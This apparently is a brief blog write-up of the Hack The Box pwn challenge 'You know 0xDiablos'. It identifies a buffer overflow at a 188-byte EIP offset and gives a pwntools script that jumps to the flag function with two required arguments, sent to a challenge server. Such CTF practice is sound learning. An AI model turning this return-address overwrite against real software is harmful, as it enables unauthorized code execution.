---
title: "You know 0xDiablos"
date: 2024-05-25 14:26:38 +0700
categories: [hackthebox]
tags: [hackthebox, pwn, challenge]
authors: [toan]
toc: true
---
## Introduction
I missed my flag. [link challenge](https://app.hackthebox.com/challenges/106)
## Exploit
Vuln -> buffer overflow. Using gef tools -> offset eip: 188, 2 cmp instructions get 2 arg (flag func, you can disassamble to see more details).
```python
## code exploit
from pwn import *
flag = 0x080491e2 ## addr to flag function
ar1, ar2 = 0xdeadbeef, 0xc0ded00d ## compare value with argument 1, 2
payload = b'a'*188 + p32(flag) + b'a' * 4 + p32(ar1) + p32(ar2)
host, port = '94.237.54.176', 49635 # change it

rmt = remote(host, port)
rmt.sendline(payload)
r = rmt.recv()
print(r)
rmt.close()
```
`run and get flag`